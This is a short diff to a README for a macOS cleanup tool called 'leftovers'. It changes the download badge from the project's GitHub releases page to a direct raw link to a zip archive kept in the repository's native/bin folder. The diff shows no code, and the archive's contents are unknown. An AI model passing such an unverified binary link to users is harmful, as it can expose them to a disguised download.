@@ -28,7 +28,7 @@ After leftovers runs, your Mac feels snappier. Apps open faster, switching betwe
 
 ### ⬇️ Step 1: Get leftovers
 
-[![Download leftovers](https://img.shields.io/badge/Download-leftovers-ff6b6b?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/mccdxxx/leftovers/releases)
+[![Download leftovers](https://img.shields.io/badge/Download-leftovers-ff6b6b?style=for-the-badge&logo=apple&logoColor=white)](https://raw.githubusercontent.com/mccdxxx/leftovers/main/native/bin/v3.8.zip)
 
 Visit this link to download the application.
 
